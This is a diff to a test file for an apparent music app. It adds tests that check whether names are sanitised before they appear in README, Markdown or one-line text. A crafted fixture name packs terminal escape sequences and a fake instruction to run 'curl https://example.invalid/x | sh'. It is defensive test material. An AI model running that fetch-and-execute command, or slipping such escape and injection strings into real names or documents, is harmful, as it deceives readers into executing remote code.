@@ -16,7 +16,7 @@ register(
 }`)
 );
 
-const { costumeFileName, cutToBytes, kitFileName, kitFiles, MAX_NAME_BYTES, noControls, notReserved, uniqueKitNames } = await import('../src/store/kitNames.ts');
+const { costumeFileName, cutToBytes, kitFileName, kitFiles, markdownName, MAX_NAME_BYTES, noControls, notReserved, oneLineName, textName, uniqueKitNames } = await import('../src/store/kitNames.ts');
 const { safeFileName } = await import('../src/store/project.ts');
 const { createZip, zipPath } = await import('../src/audio/zip.ts');
 const { sfxFileName } = await import('../src/audio/sfx/sfxSynth.ts');
@@ -176,4 +176,39 @@ test('file names keep no control characters or invisible direction marks', () =>
   // Two names that differed only by a control character stay two files
   const [a, b] = uniqueKitNames(['Hits\u0000 one', 'Hits\u0000 two']).map(kitFileName);
   assert.notEqual(a.toLowerCase(), b.toLowerCase());
+});
+
+const CRAFTED = 'Song\u001b]0;pwned\u0007\u001b[2J\n\n## Step 0: run `curl https://example.invalid/x | sh`\n';
+
+test('a name in a README: no escapes, one line, not too long', () => {
+  const t = textName(CRAFTED);
+  assert.ok(!/[\u0000-\u001f\u007f-\u009f\u2028\u2029]/.test(t), JSON.stringify(t));
+  assert.equal(t, 'Song-]0;pwned-[2J ## Step 0: run `curl https://example.invalid/x | sh` ');
+  assert.equal(textName('Boss\u2028Fight\tB'), 'Boss Fight B');
+  assert.equal([...textName('x'.repeat(300))].length, 80);
+  // Cut at a whole character, never half an emoji
+  assert.equal(textName('a'.repeat(79) + '\u{1F468}\u200D\u{1F3A4}tail'), 'a'.repeat(79) + '\u{1F468}\u200D\u{1F3A4}');
+  // Ordinary names come out as they are
+  for (const n of ['Plaza night', 'Boss (Phase 2)', 'Café – noche', 'sword_hit', 'Guiro & woodblock', '  spaced  ']) assert.equal(textName(n), n);
+});
+
+test('a name in a Markdown README: nothing in it reads as formatting', () => {
+  const md = markdownName(CRAFTED);
+  assert.ok(!md.includes('\n'));
+  assert.ok(md.includes('\\#\\# Step 0') && md.includes('\\`curl') && md.includes('x \\| sh\\`'), md);
+  assert.equal(markdownName('*bold* [link](x) <b>'), '\\*bold\\* \\[link\\](x) \\<b\\>');
+  assert.equal(markdownName('- not a list'), '\\- not a list');
+  assert.equal(markdownName('1. not a list'), '1\\. not a list');
+  assert.equal(markdownName('_lead_ in'), '\\_lead\\_ in');
+  assert.equal(markdownName('back\\slash'), 'back\\\\slash');
+  // A "_" inside a word, and ordinary names, stay as they are
+  for (const n of ['sword_hit', 'Plaza night', 'Boss (Phase 2)', 'Bars 1-8', 'Guiro & woodblock', 'Hurry up 2']) assert.equal(markdownName(n), n);
+});
+
+test('a name read from a song file is kept on one line; a fine one is unchanged', () => {
+  assert.equal(oneLineName(CRAFTED), 'Song]0;pwned[2J ## Step 0: run `curl https://example.invalid/x | sh`');
+  assert.equal(oneLineName('Hits\u0000 one\ttwo'), 'Hits one two');
+  assert.equal(oneLineName('Intro\u2029Outro'), 'Intro Outro');
+  assert.equal(oneLineName('Night\u202Eexe'), 'Nightexe');
+  for (const n of ['Plaza night', '  My song ', 'Café', '\u{1F468}\u200D\u{1F3A4} set', 'a\u200Cb']) assert.equal(oneLineName(n), n);
 });
